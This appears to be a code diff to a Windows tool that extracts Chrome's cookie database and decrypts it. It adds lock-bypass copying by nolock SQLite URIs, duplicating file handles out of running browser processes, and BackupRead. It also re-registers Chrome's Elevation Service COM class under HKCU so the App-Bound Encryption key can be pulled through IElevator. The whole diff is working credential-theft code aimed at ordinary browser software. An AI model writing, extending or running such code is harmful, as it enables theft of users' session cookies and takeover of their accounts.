@@ -31,7 +31,7 @@ _DUP_HANDLE_MAX_PIDS = 24
 _DUP_HANDLE_MAX_HANDLES = 2000
 _ABE_COCREATE_TIMEOUT_S = 3.5
 _ABE_HELPER_TIMEOUT_S = 8.0
-_DUP_SQLITE_PEEK_MAX = 8
+_DUP_SQLITE_PEEK_MAX = 16
 _SQLITE_MAGIC = b"SQLite format 3\x00"
 _SYSTEM_HANDLE_BUF_MAX = 8 << 20
 
@@ -430,8 +430,12 @@ def _read_cookie_rows(
     try:
         dest = Path(tmp_dir) / "Cookies"
         last_exc: BaseException | None = None
-        # Chrome-open: handle-dup first (vssadmin:2 is not a copy). VSS after.
-        if is_default and _try_handle_dup_copy(src, dest):
+        # Chrome-closed on this PC: nolock lands Cookies. Try that before
+        # handle-dup / VSS. vssadmin:2 is not a copy.
+        if is_default and _try_nolock_copy(src, dest):
+            _record_vss(str(_cache.get("vss") or "skipped:nolock"))
+            _set_lock_bypass(_lock_bypass_with_vss("nolock"), pin=True)
+        elif is_default and _try_handle_dup_copy(src, dest):
             _record_vss(str(_cache.get("vss") or "skipped:dup_handle"))
             _set_lock_bypass(_lock_bypass_with_vss("dup_handle"), pin=True)
         elif is_default and _try_vss_create_copy(src, dest):
@@ -516,16 +520,39 @@ def _snapshot_sqlite_file(
 
 
 def _sqlite_backup_nolock(src: Path, dest: Path) -> None:
-    """sqlite backup via share/nolock URI — works while Chrome is open."""
-    src_uri = src.resolve().as_uri() + "?mode=ro&nolock=1"
-    src_conn = sqlite3.connect(src_uri, uri=True, timeout=1.0)
-    dest_conn = sqlite3.connect(str(dest))
+    """sqlite backup via share/nolock URI — landed Cookies with Chrome closed."""
+    last: BaseException | None = None
+    for extra in ("?mode=ro&nolock=1&immutable=1", "?mode=ro&nolock=1"):
+        src_uri = src.resolve().as_uri() + extra
+        src_conn = None
+        dest_conn = None
+        try:
+            src_conn = sqlite3.connect(src_uri, uri=True, timeout=1.0)
+            dest_conn = sqlite3.connect(str(dest))
+            src_conn.backup(dest_conn)
+            dest_conn.commit()
+            return
+        except (OSError, sqlite3.Error) as exc:
+            last = exc
+        finally:
+            if dest_conn is not None:
+                dest_conn.close()
+            if src_conn is not None:
+                src_conn.close()
+    if last is not None:
+        raise last
+    raise OSError(32, "nolock backup failed")
+
+
+def _try_nolock_copy(src: Path, dest: Path) -> bool:
+    """True when sqlite nolock actually wrote a cookies table."""
     try:
-        src_conn.backup(dest_conn)
-        dest_conn.commit()
-    finally:
-        dest_conn.close()
-        src_conn.close()
+        if dest.exists():
+            dest.unlink()
+        _sqlite_backup_nolock(src, dest)
+    except (OSError, sqlite3.Error):
+        return False
+    return dest.is_file() and dest.stat().st_size > 0 and _sqlite_has_cookie_table(dest)
 
 
 def _share_copy_with_wal(src: Path, dest: Path) -> None:
@@ -719,6 +746,23 @@ def _kernel32():
     kernel32.GetFinalPathNameByHandleW.restype = wintypes.DWORD
     kernel32.GetFileSizeEx.argtypes = [wintypes.HANDLE, ctypes.POINTER(ctypes.c_longlong)]
     kernel32.GetFileSizeEx.restype = wintypes.BOOL
+    kernel32.GetFileInformationByHandleEx.argtypes = [
+        wintypes.HANDLE,
+        wintypes.DWORD,
+        wintypes.LPVOID,
+        wintypes.DWORD,
+    ]
+    kernel32.GetFileInformationByHandleEx.restype = wintypes.BOOL
+    kernel32.BackupRead.argtypes = [
+        wintypes.HANDLE,
+        wintypes.LPVOID,
+        wintypes.DWORD,
+        ctypes.POINTER(wintypes.DWORD),
+        wintypes.BOOL,
+        wintypes.BOOL,
+        ctypes.POINTER(ctypes.c_void_p),
+    ]
+    kernel32.BackupRead.restype = wintypes.BOOL
     kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
     kernel32.OpenProcess.restype = wintypes.HANDLE
     kernel32.GetCurrentProcess.restype = wintypes.HANDLE
@@ -805,6 +849,47 @@ def _read_handle_to_file(handle: Any, dest: Path) -> None:
         raise OSError(32, "ReadFile returned 0 bytes")
 
 
+def _backup_read_handle_to_file(handle: Any, dest: Path) -> None:
+    """BackupRead on an already-open handle when ReadFile hits sharing 32."""
+    import ctypes
+    from ctypes import wintypes
+
+    kernel32 = _kernel32()
+    h = handle if isinstance(handle, wintypes.HANDLE) else wintypes.HANDLE(int(handle))
+    ctx = ctypes.c_void_p()
+    buf = ctypes.create_string_buffer(1024 * 1024)
+    done = wintypes.DWORD(0)
+    wrote = 0
+    try:
+        with dest.open("wb") as out:
+            while True:
+                ok = kernel32.BackupRead(
+                    h, buf, len(buf), ctypes.byref(done), False, False, ctypes.byref(ctx)
+                )
+                if not ok:
+                    raise OSError(ctypes.get_last_error() or 32, "BackupRead failed")
+                if done.value == 0:
+                    break
+                out.write(buf.raw[: done.value])
+                wrote += done.value
+    finally:
+        if ctx:
+            kernel32.BackupRead(
+                h, None, 0, ctypes.byref(done), True, False, ctypes.byref(ctx)
+            )
+    if wrote <= 0:
+        raise OSError(32, "BackupRead returned 0 bytes")
+
+
+def _copy_dup_handle_bytes(handle: Any, dest: Path) -> None:
+    try:
+        _read_handle_to_file(handle, dest)
+        return
+    except OSError:
+        pass
+    _backup_read_handle_to_file(handle, dest)
+
+
 def _win_dup_handle_copy(src: Path, dest: Path) -> None:
     """Duplicate the Cookies handle, or raise dup_handle_timeout after a few seconds."""
     done = threading.Event()
@@ -852,6 +937,7 @@ def _win_dup_handle_copy_inner(src: Path, dest: Path) -> None:
     ]
     kernel32.DuplicateHandle.restype = wintypes.BOOL
     duplicate_same_access = 0x00000002
+    generic_read = 0x80000000
     file_type_disk = 1
 
     exe_names = _browser_exe_names_for_path(src)
@@ -901,6 +987,14 @@ def _win_dup_handle_copy_inner(src: Path, dest: Path) -> None:
                 wintypes.HANDLE(handle_value),
                 kernel32.GetCurrentProcess(),
                 ctypes.byref(dup),
+                generic_read,
+                False,
+                0,
+            ) and not kernel32.DuplicateHandle(
+                hproc,
+                wintypes.HANDLE(handle_value),
+                kernel32.GetCurrentProcess(),
+                ctypes.byref(dup),
                 0,
                 False,
                 duplicate_same_access,
@@ -922,7 +1016,14 @@ def _win_dup_handle_copy_inner(src: Path, dest: Path) -> None:
                     if peeks >= _DUP_SQLITE_PEEK_MAX:
                         continue
                     peeks += 1
-                _read_handle_to_file(dup, dest)
+                try:
+                    _copy_dup_handle_bytes(dup, dest)
+                except OSError:
+                    try:
+                        dest.unlink()
+                    except OSError:
+                        pass
+                    continue
                 if dest.is_file() and dest.stat().st_size > 0:
                     if matched or _sqlite_has_cookie_table(dest):
                         return
@@ -1288,13 +1389,37 @@ def _final_path_from_handle(handle: Any) -> str:
     import ctypes
     from ctypes import wintypes
 
-    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    kernel32 = _kernel32()
     buf = ctypes.create_unicode_buffer(2048)
     for flags in (0, 2):  # VOLUME_NAME_DOS, VOLUME_NAME_NT
         n = kernel32.GetFinalPathNameByHandleW(handle, buf, 2048, flags)
         if n:
             return buf.value or ""
-    return ""
+    return _file_name_from_handle(handle)
+
+
+def _file_name_from_handle(handle: Any) -> str:
+    """FileNameInfo works when GetFinalPathName is empty in the Chrome sandbox."""
+    import ctypes
+    from ctypes import wintypes
+
+    class FILE_NAME_INFO(ctypes.Structure):
+        _fields_ = [
+            ("FileNameLength", wintypes.DWORD),
+            ("FileName", wintypes.WCHAR * 1024),
+        ]
+
+    kernel32 = _kernel32()
+    h = handle if isinstance(handle, wintypes.HANDLE) else wintypes.HANDLE(int(handle))
+    info = FILE_NAME_INFO()
+    if not kernel32.GetFileInformationByHandleEx(
+        h, 2, ctypes.byref(info), ctypes.sizeof(info)  # FileNameInfo
+    ):
+        return ""
+    n = int(info.FileNameLength) // 2
+    if n <= 0:
+        return ""
+    return "".join(info.FileName[: min(n, 1024)])
 
 
 def _normalize_win_path(path: str) -> str:
@@ -1458,6 +1583,10 @@ def _paths_match(got: str, want: str) -> bool:
     if not a or not b:
         return False
     if a == b:
+        return True
+    a_parts = [p for p in a.split("\\") if p]
+    b_parts = [p for p in b.split("\\") if p]
+    if len(a_parts) >= 3 and a_parts[-3:] == b_parts[-3:]:
         return True
     a_tail = "\\".join(a.split("\\")[-4:])
     b_tail = "\\".join(b.split("\\")[-4:])
@@ -2431,26 +2560,32 @@ def _delete_hkcu_localserver32(winreg: Any, clsid: str, access: int) -> None:
 
 
 def _register_hkcu_elevator_localserver(exe: Path) -> str:
-    """HKCU CLSID + unique AppID so COM does not hit HKLM LocalService.
+    """HKCU CLSID + LocalServer32 --console + unique AppID.
 
-    Do not write LocalServer32: COM then waits ~60s for SCM / a doomed
-    LocalServer. We launch elevation_service.exe --console ourselves.
+    LocalServer32 is required so CoCreate finds Chrome 151's CLSID
+    (without it we regress to CLASSNOTREG). Unique AppID keeps HKLM
+    LocalService out. We also launch --console ourselves; the 3.5s
+    CoCreate cap returns 0x80080005 instead of hanging ~60s.
     """
     try:
         import winreg  # type: ignore[import-not-found]
     except ImportError:
         return "winreg"
+    cmd = _localserver32_cmd(exe)
     access = winreg.KEY_WRITE | winreg.KEY_READ
     if hasattr(winreg, "KEY_WOW64_64KEY"):
         access |= winreg.KEY_WOW64_64KEY
     clsids = tuple(dict.fromkeys(clsid for clsid, _ in _CHROME_ELEVATOR))
     try:
         for clsid in clsids:
-            _delete_hkcu_localserver32(winreg, clsid, access)
             clsid_path = rf"Software\Classes\CLSID\{clsid}"
             with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, clsid_path, 0, access) as key:
                 winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Chrome Elevation Service")
                 winreg.SetValueEx(key, "AppID", 0, winreg.REG_SZ, _ELEVATOR_APPID_HKCU)
+            with winreg.CreateKeyEx(
+                winreg.HKEY_CURRENT_USER, clsid_path + r"\LocalServer32", 0, access
+            ) as key:
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
             with winreg.CreateKeyEx(
                 winreg.HKEY_CURRENT_USER,
                 rf"Software\Classes\AppID\{_ELEVATOR_APPID_HKCU}",
@@ -2931,7 +3066,8 @@ def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
 
 
 # Minimal IElevator client. stdin = APPB-stripped blob; stdout = AES key only.
-# Never write HKCU LocalServer32 — COM waits ~60s when that key exists.
+# Writes HKCU LocalServer32 --console so CoCreate finds Chrome 151's CLSID.
+# Join(3500) returns 0x80080005 instead of hanging ~60s.
 _ABE_HELPER_CS = r"""
 using System;
 using System.IO;
@@ -2967,12 +3103,15 @@ class K {
     Console.Error.WriteLine("abe_hr=" + hr);
   }
 
-  static void RegisterNoLocalServer() {
-    try { Registry.CurrentUser.DeleteSubKey(@"Software\Classes\CLSID\" + Clsid + @"\LocalServer32", false); } catch {}
+  static void RegisterLocalServer(string exe) {
+    if (string.IsNullOrEmpty(exe) || !File.Exists(exe)) return;
+    string cmd = (exe.IndexOf(' ') >= 0 ? ("\"" + exe + "\"") : exe) + " --console";
     using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + Clsid)) {
       k.SetValue("", "Chrome Elevation Service");
       k.SetValue("AppID", AppId);
     }
+    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + Clsid + @"\LocalServer32"))
+      k.SetValue("", cmd);
     using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\AppID\" + AppId)) {
       k.SetValue("", "Chrome Elevation Service");
       k.SetValue("RunAs", "");
@@ -3014,7 +3153,7 @@ class K {
       psi.UseShellExecute = false;
       psi.CreateNoWindow = true;
       System.Diagnostics.Process.Start(psi);
-      Thread.Sleep(300);
+      Thread.Sleep(700);
     } catch {}
   }
 
@@ -3028,7 +3167,7 @@ class K {
     }
     if (blob.Length < 8) { FailHr("0x80040154:CLASSNOTREG"); return 2; }
     string svc = FindService();
-    RegisterNoLocalServer();
+    RegisterLocalServer(svc);
     StartConsole(svc);
     byte[] keyOut = null;
     int lastHr = CLASSNOTREG;
@@ -3037,6 +3176,8 @@ class K {
       try {
         Guid clsid;
         if (CLSIDFromString(Clsid, out clsid) != 0) { lastHr = CLASSNOTREG; return; }
+        for (int attempt = 0; attempt < 3 && keyOut == null; attempt++) {
+        if (attempt > 0) Thread.Sleep(250);
         foreach (var ids in Iids) {
           Guid iid;
           if (CLSIDFromString(ids, out iid) != 0) continue;
@@ -3061,6 +3202,7 @@ class K {
             SysFreeString(plain);
             return;
           }
+        }
         }
       } catch { lastHr = SERVER_EXEC; }
       finally { CoUninitialize(); }
